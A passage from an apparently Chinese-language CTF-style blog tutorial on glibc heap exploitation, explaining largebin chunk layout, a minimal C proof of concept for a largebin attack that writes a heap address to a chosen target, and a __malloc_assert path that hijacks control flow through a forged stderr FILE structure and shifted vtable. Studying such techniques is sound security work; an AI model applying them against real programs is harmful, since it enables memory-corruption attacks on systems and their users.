</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2024/12/12/675a8d7e437fb.png" alt="Screenshot 2024-12-12 151434.png"/></p> <h5 id="上面一行0x4000x430虽然是这么写-但实际上只有chunksize--0x420-也即malloc0x410以上才会放到largebin">   上面一行<code class="language-plaintext highlighter-rouge">0x400~0x430</code>虽然是这么写, 但实际上只有chunksize &gt; 0x420, 也即<code class="language-plaintext highlighter-rouge">malloc(0x410)</code>以上才会放到largebin<br/></h5> <h5 id="一个largebin内chunksize是非升序排列的-也就是从大到小的趋势-图中从左向右-main_arena作为链表的尾--大小相同的紧挨着">   一个largebin内chunksize是非升序排列的, 也就是从大到小的趋势 (图中从左向右, main_arena作为链表的尾) , 大小相同的紧挨着<br/></h5> <h5 id="largebin-chunk内部的存放有管理这个链表的信息-fd-bk-fd_nextsize-bk_nextsize-fd-bk和其他bin没有区别-连接着该bin中的所有chunk-以及该bin所对应的main_arena">   largebin chunk内部的存放有管理这个链表的信息, <code class="language-plaintext highlighter-rouge">fd, bk, fd_nextsize, bk_nextsize</code>, <code class="language-plaintext highlighter-rouge">fd, bk</code>和其他bin没有区别, 连接着该bin中的所有chunk, 以及该bin所对应的<code class="language-plaintext highlighter-rouge">main_arena</code><br/></h5> <h5 id="再看一个码-大概意思就是一个chunksize有两个-一个bin内一共6个">   再看一个码, 大概意思就是一个chunksize有两个, 一个bin内一共6个</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="o">*</span><span class="n">p</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x430</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x430</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x440</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x440</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x450</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span>  <span class="n">malloc</span><span class="p">(</span><span class="mh">0x450</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>

    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x500</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>   
<span class="p">}</span>
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2024/12/12/675ae050022e3.png" alt="Screenshot 2024-12-12 210547.png"/></p> <h5 id="给大们画一个-但是手太僵了">   给大🔥们画一个, 但是手太僵了</h5> <p><img src="https://www.helloimg.com/i/2024/12/12/675ae05088772.jpg" alt="扫描全能王 2024-12-12 21.02.jpg"/></p> <h5 id="由fd-bk-连接起了全部chunk和main_arena-这也是gdb上展示的顺序">   由<code class="language-plaintext highlighter-rouge">fd, bk</code>, 连接起了全部chunk和<code class="language-plaintext highlighter-rouge">main_arena</code>, 这也是gdb上展示的顺序<br/></h5> <h5 id="其次fd_nextsize-bk_nextsize-只有每一组大小相同的chunks中的第一个才有这两个内容-并且不连接main_arena">   其次<code class="language-plaintext highlighter-rouge">fd_nextsize, bk_nextsize</code>, 只有每一组大小相同的chunks中的第一个才有这两个内容, 并且不连接<code class="language-plaintext highlighter-rouge">main_arena</code><br/></h5> <h5 id="特别地-当一个bin中只有两组不同大小的chunks时-一个组的fd_nextsize-bk_nextsize都指向另一组因为双向链表-只有一组时-这对指针都会指向自己">   特别地, 当一个bin中只有两组不同大小的chunks时, 一个组的<code class="language-plaintext highlighter-rouge">fd_nextsize, bk_nextsize</code>都指向另一组(因为双向链表); 只有一组时, 这对指针都会指向自己</h5> <h5 id="fd_nextsize-bk_nextsize是专门用于管理同一个large-bin中不同大小的chunk的排列的-这一组指针和上一组不同-并不会连接main_arena">   <code class="language-plaintext highlighter-rouge">fd_nextsize, bk_nextsize</code>是专门用于管理同一个large bin中不同大小的chunk的排列的, 这一组指针和上一组不同, 并不会连接<code class="language-plaintext highlighter-rouge">main_arena</code><br/></h5> <h5 id="large-bin-attack主要攻击的是fd_nextsize-bk_nextsize这一组指针">   large bin attack主要攻击的是<code class="language-plaintext highlighter-rouge">fd_nextsize, bk_nextsize</code>这一组指针</h5> <h5 id="-看一段glibc源码">    看一段glibc源码</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">size</span> <span class="o">==</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">fwd</span><span class="p">)){</span>
    <span class="cm">/* Always insert in the second position.  */</span>
    <span class="c1">/// 当存在一个chunk的size与victim一致</span>
    <span class="n">fwd</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
<span class="k">else</span><span class="p">{</span>
        <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
        <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="n">fwd</span><span class="p">))</span>
            <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"malloc(): largebin double linked list corrupted (nextsize)"</span><span class="p">);</span>
        <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
        <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
<span class="p">}</span>
    <span class="n">bck</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">fwd</span><span class="p">)</span>
        <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"malloc(): largebin double linked list corrupted(bk)"</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div> <h5 id="有问题的语句在victim-bk_nextsize--fwd-bk_nextsize和victim-bk_nextsize-fd_nextsize--victim-即当找不到一个相同size的chunk-目标victim必须生成一对nextsize-来管理它自己size大小的large-chunks-问题在于缺少对于fwd-bk_nextsize的检查-它实际上有可能被篡改为其他地址">   有问题的语句在<code class="language-plaintext highlighter-rouge">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize</code>和<code class="language-plaintext highlighter-rouge">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code>, 即当找不到一个相同size的chunk, 目标victim必须生成一对<code class="language-plaintext highlighter-rouge">nextsize</code>, 来管理它自己size大小的large chunks, 问题在于缺少对于<code class="language-plaintext highlighter-rouge">fwd-&gt;bk_nextsize</code>的检查, 它实际上有可能被篡改为其他地址<br/></h5> <h5 id="现给出一个实现该large-bin-attack的最小利用">   现给出一个实现该large bin attack的最小利用</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="c1">/// @note 假设我们需要将一个堆地址写到a[4]的位置</span>

<span class="kt">size_t</span> <span class="n">a</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="o">*</span><span class="n">p1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x420</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">p2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x410</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>

    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x440</span><span class="p">);</span> <span class="c1">// clear unsorted bins</span>

    <span class="n">p1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="c1">// largebin.bk_nextsize = target - 0x20</span>

    <span class="n">free</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span>
    
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x440</span><span class="p">);</span> <span class="cm">/* clear unsorted bins
                    * and trigger the attack
                    */</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="p13--a0之后-bk_nextsize变成了a0的形状">   <code class="language-plaintext highlighter-rouge">p1[3] = &amp;a[0]</code>之后, <code class="language-plaintext highlighter-rouge">bk_nextsize</code>变成了<code class="language-plaintext highlighter-rouge">&amp;a[0]</code>的形状</h5> <p><img src="https://www.helloimg.com/i/2024/12/12/675aea0dc26bf.png" alt="Screenshot 2024-12-12 214851.png"/></p> <h5 id="第二个malloc0x440之后-触发了attack">   第二个<code class="language-plaintext highlighter-rouge">malloc(0x440)</code>之后, 触发了attack</h5> <p><img src="https://www.helloimg.com/i/2024/12/12/675aea0dcd486.png" alt="Screenshot 2024-12-12 214925.png"/></p> <h5 id="检查a4-发现确实篡改-并且堆地址是">   检查<code class="language-plaintext highlighter-rouge">a[4]</code>, 发现确实篡改, 并且堆地址是</h5> <p><img src="https://www.helloimg.com/i/2024/12/12/675aea0dc1da0.png" alt="Screenshot 2024-12-12 215003.png"/></p> <h5 id="具体发生了什么-请看png">   具体发生了什么, 请看PNG</h5> <p><img src="https://www.helloimg.com/i/2024/12/12/675aef54cb20d.jpg" alt="扫描全能王 2024-12-12 22.11.jpg"/></p> <h5 id="所以不难总结出部署一次largebin-attack的方法">   所以不难总结出部署一次largebin attack的方法:</h5> <h5 id="1准备一个chunk1-free掉-它将作为之后源码中的fwd2申请一个比chunk1大的堆块-chunk1就被放在large-bin中3uaf或者堆溢出-修改chunk1的bk_nextsize为你指定的地址target的低0x10-即target---0x204申请一个chunk2-它比chunk1小-但是应该被放在同一个bin-free它-作为源码中的victim存在5重复2所做的事-这会触发largebin-attack-并在target位置写上victim的chunkhead的地址">    1.准备一个chunk1, free掉, 它将作为之后源码中的<code class="language-plaintext highlighter-rouge">fwd</code><br/>    2.申请一个比chunk1大的堆块, chunk1就被放在large bin中<br/>    3.UAF或者堆溢出, 修改chunk1的<code class="language-plaintext highlighter-rouge">bk_nextsize</code>为你指定的地址target的低0x10, 即<code class="language-plaintext highlighter-rouge">target - 0x20</code><br/>    4.申请一个chunk2, 它比chunk1小, 但是应该被放在同一个bin, free它, 作为源码中的<code class="language-plaintext highlighter-rouge">victim</code>存在<br/>    5.重复2所做的事, 这会触发largebin attack, 并在<code class="language-plaintext highlighter-rouge">target</code>位置写上<code class="language-plaintext highlighter-rouge">victim</code>的chunkhead的地址</h5> <h3 id="__malloc_assert劫持控制流">__malloc_assert劫持控制流</h3> <h4 id="劫持路径"> 劫持路径</h4> <h5 id="__malloc_assert是一个用于判断堆分配请求是否合理的函数-有许多方式来触发这个函数-选取其中最简单的方法-使用某种手法来修改top-chunk的chunksize位-使得它小于之后要申请的chunk的大小-注意这里与house-of-orange相反-我们需要让修改后的-chunksize_nomasksize--chunk_head不与内存页对齐-从而触发异常-__malloc_assert会尝试将错误信息输入到stderr这个输入的过程的调用过程如下">   <code class="language-plaintext highlighter-rouge">__malloc_assert</code>是一个用于判断堆分配请求是否合理的函数, 有许多方式来触发这个函数; <br/>   选取其中最简单的方法, 使用某种手法来修改top chunk的chunksize位, 使得它小于之后要申请的chunk的大小, 注意这里与house of orange相反, 我们需要让修改后的 <code class="language-plaintext highlighter-rouge">chunksize_nomask(size) + &amp;chunk_head</code>不与内存页对齐, 从而触发异常. <code class="language-plaintext highlighter-rouge">__malloc_assert</code>会尝试将错误信息输入到<code class="language-plaintext highlighter-rouge">stderr</code><br/>   这个输入的过程的调用过程如下</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__malloc_assert</span><span class="p">()</span> <span class="o">--</span><span class="p">(</span><span class="n">assert</span> <span class="nb">false</span><span class="p">)</span><span class="o">--&gt;</span> <span class="n">__fxprintf</span> <span class="o">----&gt;</span> <span class="n">vfxprintf</span><span class="p">()</span> <span class="o">----&gt;</span> <span class="n">locked_vfxprintf</span><span class="p">()</span> <span class="o">----&gt;</span> <span class="n">__vfprintf_internal</span><span class="p">()</span> <span class="o">----&gt;</span> <span class="n">_IO_file_xsputn</span><span class="p">()</span>
</code></pre></div></div> <h5 id="一路到最后-函数尝试调用了_io_file_xputsn-而这个函数正好是通过_io_file_plus结构体中的vtable加上偏移计算的-这就给了我们篡改的机会">   一路到最后, 函数尝试调用了<code class="language-plaintext highlighter-rouge">_IO_file_xputsn()</code>, 而这个函数正好是通过<code class="language-plaintext highlighter-rouge">_IO_file_plus</code>结构体中的vtable加上偏移计算的, 这就给了我们篡改的机会,</h5> <p><a href="https://www.helloimg.com/i/2024/12/13/675b91b714ab9.png"><img src="https://www.helloimg.com/i/2024/12/13/675b91b714ab9.png" alt="Screenshot 2024-12-13 094514.png"/></a></p> <h5 id="下面的_io_file_jumps就是被查询的虚表-关注在__xsputn下方0x10偏移处的__seekoff">   下面的<code class="language-plaintext highlighter-rouge">_IO_file_jumps</code>就是被查询的虚表, 关注在<code class="language-plaintext highlighter-rouge">__xsputn</code>下方0x10偏移处的<code class="language-plaintext highlighter-rouge">__seekoff</code><br/></h5> <h5 id="-下面是seekoff的源码-省去不重要的信息-发现在return之前会调用_io_switch_to_wget_modefp-这里的fp毫无疑问应该是stderr">    下面是seekoff的源码, 省去不重要的信息, 发现在return之前会调用<code class="language-plaintext highlighter-rouge">_IO_switch_to_wget_mode(fp)</code>, 这里的<code class="language-plaintext highlighter-rouge">fp</code>毫无疑问应该是<code class="language-plaintext highlighter-rouge">stderr</code></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_IO_wfile_seekoff</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="n">off64_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dir</span><span class="p">,</span> <span class="kt">int</span> <span class="n">mode</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">off64_t</span> <span class="n">result</span><span class="p">;</span>
  <span class="n">off64_t</span> <span class="n">delta</span><span class="p">,</span> <span class="n">new_offset</span><span class="p">;</span>
  <span class="kt">long</span> <span class="kt">int</span> <span class="n">count</span><span class="p">;</span>

    <span class="c1">///@warning 这里的mode和下面的must_be_exact需要想办法绕过</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">mode</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">do_ftell_wide</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>

  <span class="kt">int</span> <span class="n">must_be_exact</span> <span class="o">=</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span>
            <span class="o">==</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
               <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span>
               <span class="o">==</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">));</span>

  <span class="n">bool</span> <span class="n">was_writing</span> <span class="o">=</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
		       <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
		      <span class="o">||</span> <span class="n">_IO_in_put_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">));</span>


  <span class="k">if</span> <span class="p">(</span><span class="n">was_writing</span> <span class="o">&amp;&amp;</span> <span class="n">_IO_switch_to_wget_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
<span class="p">......</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="_io_switch_to_wget_mode-又到了_io_woverflow">   <code class="language-plaintext highlighter-rouge">_IO_switch_to_wget_mode</code>, 又到了<code class="language-plaintext highlighter-rouge">_IO_WOVERFLOW()</code>,</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_IO_switch_to_wget_mode</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">((</span><span class="kt">wint_t</span><span class="p">)</span><span class="n">_IO_WOVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">WEOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">WEOF</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">...</span>
    <span class="p">...</span>
    <span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="_io_woverflow的汇编-注意-37-位置的call指令-只要能够控制rax-就可以劫持控制流了finally">   <code class="language-plaintext highlighter-rouge">_IO_WOVERFLOW()</code>的汇编, 注意 +37 位置的call指令, 只要能够控制<code class="language-plaintext highlighter-rouge">rax</code>, 就可以劫持控制流了(finally!)</h5> <p><img src="https://www.helloimg.com/i/2024/12/13/675b9615d8209.png" alt="Screenshot 2024-12-13 100413.png"/></p> <h5 id="现在需要知道rax在call之前是如何赋值的-由于rdi始终没有变-所以以rdi作为基准-rdx--rdi--0xc0-rax--rdi--0xa0--0xe0-rsi--0xffffffff-根据blog-httpsxzaliyuncomt13016time__1311gqmhbkykgiqgx0hq1duwxgcwv2xtdpydtoc-5-这里的rdi实际上是一个堆地址">   现在需要知道<code class="language-plaintext highlighter-rouge">rax</code>在call之前是如何赋值的, 由于rdi始终没有变, 所以以rdi作为基准, <code class="language-plaintext highlighter-rouge">rdx = rdi + 0xc0; rax = rdi + 0xa0 + 0xe0; rsi = 0xffffffff</code>, 根据blog https://xz.aliyun.com/t/13016?time__1311=GqmhBKYKGIqGx0HQ1DuWxgCWv2xTDpYD#toc-5, 这里的rdi实际上是一个堆地址<br/></h5> <h5 id="有一点不一样-就是上面blog中的_io_woverflow的源码没有mov-esi-0xffffffff-笔者glibc版本235-所以在此情况之下-实际上只能向call指令的函数传一个有效的参数rdi-对此-可以使用setcontext这个gadget-因为它主要使用rdx和偏移来设置其他寄存器-而rdx是可以被控制的">   有一点不一样, 就是上面blog中的<code class="language-plaintext highlighter-rouge">_IO_WOVERFLOW()</code>的源码没有<code class="language-plaintext highlighter-rouge">mov esi, 0xffffffff</code>, (笔者glibc版本2.35), 所以在此情况之下, 实际上只能向call指令的函数传一个有效的参数(rdi). 对此, 可以使用<code class="language-plaintext highlighter-rouge">setcontext</code>这个gadget, 因为它主要使用rdx和偏移来设置其他寄存器, 而rdx是可以被控制的<br/></h5> <h5 id="总而言之-需要将原本的stderr的地址修改为可控的一大块数据通过largebin-attack-然后将其中的_io_file_jumps虚表-改为该虚表--0x10-的值-然后触发__malloc_assert">   总而言之, 需要将原本的stderr的地址修改为可控的一大块数据(通过largebin attack), 然后将其中的<code class="language-plaintext highlighter-rouge">_IO_file_jumps</code>虚表, 改为<code class="language-plaintext highlighter-rouge">该虚表 + 0x10 的值</code>, 然后触发<code class="language-plaintext highlighter-rouge">__malloc_assert</code></h5> <h4 id="-伪造_io_file结构体">  伪造_IO_FILE结构体</h4> <h5 id="从上面的分析来看-完成劫持需要制造错误的vtable偏移-需要绕过mode-must_be_exact-was_writing的检查-这些内容可以通过通过伪造一个假的_io_file_complete结构体-在把原本的stderr用这个假的替换-即可满足所以这里有必要了解一下_io_file等结构体的结构">   从上面的分析来看, 完成劫持需要制造错误的vtable偏移, 需要绕过mode, must_be_exact, was_writing的检查, 这些内容可以通过通过伪造一个假的_IO_FILE_complete结构体, 在把原本的stderr用这个假的替换, 即可满足<br/>   所以这里有必要了解一下_IO_FILE等结构体的结构<br/></h5> <h5 id="首先是_io_file结构体-内容比较多-但主要关注于前面8个指针-它们和绕过检查有关中间的_io_backup_base-似乎一些手法可能会用得到-但不是这里然后是chain结构体-用来连接其他的结构体-比如stderr会连接stdout上文的图中">   首先是_IO_FILE结构体, 内容比较多, 但主要关注于前面8个指针, 它们和绕过检查有关<br/>   中间的<code class="language-plaintext highlighter-rouge">_IO_backup_base</code>, 似乎一些手法可能会用得到, 但不是这里<br/>   然后是<code class="language-plaintext highlighter-rouge">chain</code>结构体, 用来连接其他的结构体, 比如stderr会连接stdout(上文的图中)</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_FILE</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>		<span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>

  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_ptr</span><span class="p">;</span>	<span class="cm">/* Current read pointer */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_end</span><span class="p">;</span>	<span class="cm">/* End of get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_base</span><span class="p">;</span>	<span class="cm">/* Start of putback+get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_base</span><span class="p">;</span>	<span class="cm">/* Start of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_ptr</span><span class="p">;</span>	<span class="cm">/* Current put pointer. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_end</span><span class="p">;</span>	<span class="cm">/* End of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_base</span><span class="p">;</span>	<span class="cm">/* Start of reserve area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_end</span><span class="p">;</span>	<span class="cm">/* End of reserve area. */</span>

  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>

  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>

  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
  <span class="n">__off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it's too small.  */</span>

  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
<span class="cp">#ifdef _IO_USE_OLD_IO_FILE
</span><span class="p">};</span>
</code></pre></div></div> <h5 id="然后是_io_file_complete结构体-是_io_file的加长版-关注_wide_data指针-和绕过检查有关系">   然后是<code class="language-plaintext highlighter-rouge">_IO_FILE_complete</code>结构体, 是<code class="language-plaintext highlighter-rouge">_IO_FILE</code>的加长版, 关注<code class="language-plaintext highlighter-rouge">_wide_data</code>指针, 和绕过检查有关系</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_FILE_complete</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="n">_file</span><span class="p">;</span>
<span class="cp">#endif
</span>  <span class="n">__off64_t</span> <span class="n">_offset</span><span class="p">;</span>
  <span class="cm">/* Wide character stream stuff.  */</span>
  <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">_codecvt</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_wide_data</span> <span class="o">*</span><span class="n">_wide_data</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_freeres_list</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">_freeres_buf</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">__pad5</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_mode</span><span class="p">;</span>
  <span class="cm">/* Make sure we don't get into trouble again.  */</span>
  <span class="kt">char</span> <span class="n">_unused2</span><span class="p">[</span><span class="mi">15</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)];</span>
<span class="p">};</span>
</code></pre></div></div> <h5 id="_io_file_plus结构体-在_io_file基础上加入一个vtable指针虚表指针-虚表指针中存放的是io相关的操作函数其次-注意上面源代码中的ifdef宏定义-_io_file_plus中的_io_file也可以指的是_io_file_complete结构体">   <code class="language-plaintext highlighter-rouge">_IO_FILE_PLUS</code>结构体, 在<code class="language-plaintext highlighter-rouge">_IO_FILE</code>基础上加入一个vtable指针(虚表指针), 虚表指针中存放的是IO相关的操作函数<br/>   其次, 注意上面源代码中的<code class="language-plaintext highlighter-rouge">#ifdef</code>宏定义, <code class="language-plaintext highlighter-rouge">_IO_FILE_PLUS</code>中的<code class="language-plaintext highlighter-rouge">_IO_FILE</code>也可以指的是<code class="language-plaintext highlighter-rouge">_IO_FILE_COMPLETE</code>结构体</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_FILE_plus</span>
<span class="p">{</span>
  <span class="n">_IO_FILE</span> <span class="n">file</span><span class="p">;</span>
